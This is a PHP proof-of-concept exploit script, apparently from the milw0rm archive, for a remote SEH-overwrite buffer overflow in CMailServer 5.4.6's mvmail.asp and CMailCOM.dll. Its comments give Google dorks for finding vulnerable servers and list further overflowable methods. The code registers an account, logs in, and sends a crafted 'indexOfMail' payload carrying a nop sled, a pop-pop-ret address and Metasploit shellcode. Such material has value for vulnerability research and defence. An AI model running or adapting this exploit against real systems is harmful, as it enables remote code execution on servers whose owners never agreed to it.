<?php
    /*
        CMailServer 5.4.6 mvmail.asp/CMailCOM.dll remote seh overwrite
	proof of concept exploit

        by Nine:Situations:Group::bruiser

        our site: http://retrogod.altervista.org/

        software site: http://www.youngzsoft.net/cmailserver/

        Google dorks:
        intitle:"Mail Server CMailServer WebMail"
        intitle:"Mail Server CMailServer WebMail 5.4.6"

        Some notes:
        This server provides a IIS/webmail interface and a registered component
	vulnerable to multiple buffer overflows, among the others, the
	CMailCom.POP3 class with CLSID 6971D9B8-B53E-4C25-A414-76199768A592.
        This class is called by various ASP scripts inside the main folder...
	I found this clear vector, look mwmail.asp , lines 25-35:

          ...
	  Set objPOP3 = CreateObject("CMailCOM.POP3.1")
          objPOP3.Login Session("User"), Session("Pass")
          Session("LoginSuccess") = objPOP3.LoginSuccess
          If Session("LoginSuccess") = 1 Then
	  set rs=Server.createobject("adodb.recordset")
  	    rs.open "mailfolder",Conn,1,3
	    i = 0
	    arrString = Split(Request("indexOfMail"), ";", -1, 1)
	    While Len(arrString(i)) <> 0
	        strUID = arrString(i)
	        objPOP3.MoveToFolder strUID ' <---------------- bof
	  ...

	By attaching olly to the w3wp.exe sub-process you will see the usual
	dump with ecx and eip owned, with a buffer of approxymately 13000 chars.

        Exploitation is post-auth but you can have a user account by simply
	browsing the signup.asp page, enabled by default.
        Calc.exe will run with NETWORK SERVICE privilege, check tasks. Note
	that 4-5 failed exploit attempts may result in IIS "Service
	Unavailiable" message.

        Other attacks are possible, see a list of locally overflowable
        methods:
        CreateUserPath, Logout, DeleteMailByUID, MoveToInbox, MoveToFolder,
	DeleteMailEx,  GetMailDataEx, SetReplySign, SetForwardSign, SetReadSign.
	Note also that remotely there's some kind of validation (ex. you can
	not have a username with a length of more than 4000 chars which
	could be used instead to overflow the CreateUserPath method and
	you cannot overflow ex. through the strUID argument) which reduces a lot
	the remote vectors. However, as you can see there's no filter on
	"indexOfMail" one.

        Other notes:
        CMailCOM.SMTP class with CLSID 0609792F-AB56-4CB6-8909-19CDF72CB2A0
	is also vulnerable in the following methods:
        AddAttach, SetSubject, SetBcc, SetBody, SetCc, SetFrom,
        SetTo, SetFromUID
    */

        error_reporting(7);$host=$argv[1];$path=$argv[2];
        $argv[3] ? $port = (int) $argv[3] : $port = 80;
        print ("CMailServer 5.4.6 mvmail.asp/CMailCOM.dll remote seh overwrite\n".
               "exploit\n".
               "by Nine:Situations:Group::bookoo\n");
        $argv[2] ? print("attackin'...\n") : die ("syntax:  php ".$argv[0]." [host] [path] [[port]]\n".
	                                          "example: php ".$argv[0]." 192.168.0.1 /mail/    \n".
	                                          "   ''    php ".$argv[0]." 192.168.0.1 / 81      \n");
        $url = "http://$host:$port";
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
        $win ? dl("php_curl.dll") : dl("php_curl.so");

        //borrowed from bookoo
        function send($packet,$out)  {

            global $url, $data;

	    if (!extension_loaded("curl"){
		    die("you need the curl extesion loaded to run...");
            }
	    $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $packet);
            $data = curl_exec($ch); if (curl_errno($ch)) {
                print curl_error($ch)."\n";
            } else {
               curl_close($ch);
            }
            if ($out) print($data."\n");
        }

        $agent="Mozilla/5.0 (Windows; U; Windows NT 5.2; it; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15";
        //subscribe
        $usr="bookoo";$pwd="password";//new usr username & password, change
	$d ="Signup=1&Account=$usr&Pass=$pwd&RePass=$pwd&UserName=&Comment=User&POP3Mail=%40ieqowieoqw.com";
        $h ="POST ".$path."signup.asp HTTP/1.0\r\nHost: $host\r\nUser-Agent: $agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($d)."\r\nConnection: Close\r\n\r\n$d";
	send($h,0);
	$tmp=explode("Set-Cookie: ",$data);
	for ($i=1; $i<count($tmp);$i++){ $tmpi=explode(" ",$tmp[$i]);$sess=$tmpi[0];$pos=strpos($sess, "ASPSESSIONID");	if ($pos === true) break; echo $sess."\n";}
	//login
	$d  ="User=$usr&Pass=$pwd&SaveUserPass=on";
        $h ="POST ".$path."login.asp HTTP/1.0\r\nHost: $host\r\nUser-Agent: $agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($d)."\r\nCookie: $sess SaveUserPass=1; Pass=$pwd; User=$usr;\r\nConnection: Close\r\n\r\n$d";
      	send($h,0);
      	//attack
        //bad chars: \x3b \x2f
        # win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=Pex http://metasploit.com
        $shellcode =
        "\x2b\xc9\x83\xe9\xde\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xcf".
        "\x67\x5f\x11\x83\xee\xfc\xe2\xf4\x33\x8f\x1b\x11\xcf\x67\xd4\x54".
        "\xf3\xec\x23\x14\xb7\x66\xb0\x9a\x80\x7f\xd4\x4e\xef\x66\xb4\x58".
        "\x44\x53\xd4\x10\x21\x56\x9f\x88\x63\xe3\x9f\x65\xc8\xa6\x95\x1c".
        "\xce\xa5\xb4\xe5\xf4\x33\x7b\x15\xba\x82\xd4\x4e\xeb\x66\xb4\x77".
        "\x44\x6b\x14\x9a\x90\x7b\x5e\xfa\x44\x7b\xd4\x10\x24\xee\x03\x35".
        "\xcb\xa4\x6e\xd1\xab\xec\x1f\x21\x4a\xa7\x27\x1d\x44\x27\x53\x9a".
        "\xbf\x7b\xf2\x9a\xa7\x6f\xb4\x18\x44\xe7\xef\x11\xcf\x67\xd4\x79".
        "\xf3\x38\x6e\xe7\xaf\x31\xd6\xe9\x4c\xa7\x24\x41\xa7\x97\xd5\x15".
        "\x90\x0f\xc7\xef\x45\x69\x08\xee\x28\x04\x3e\x7d\xac\x67\x5f\x11";
        $jmp_short="\xeb\x10\x90\x90";
	$seh="\xf1\xda\x02\x10"; #0x1002DAF1    cmailcom.dll / pop ecx - pop - ret
        $nop=str_repeat("\x90",12648);
	$bof= $nop . $jmp_short. $seh . str_repeat("\x90",24). $shellcode ;
	$d="sel=aaaa&ToFolder=4&indexOfMail=".urlencode($bof)."&mailcount=1&pages=";
        $h ="POST ".$path."mvmail.asp HTTP/1.0\r\nHost: $host\r\nUser-Agent: $agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($d)."\r\nCookie: $sess SaveUserPass=1; Pass=$pwd; User=$usr;\r\nConnection: Close\r\n\r\n$d";
        send($h,1);
?>

# milw0rm.com [2008-07-06]
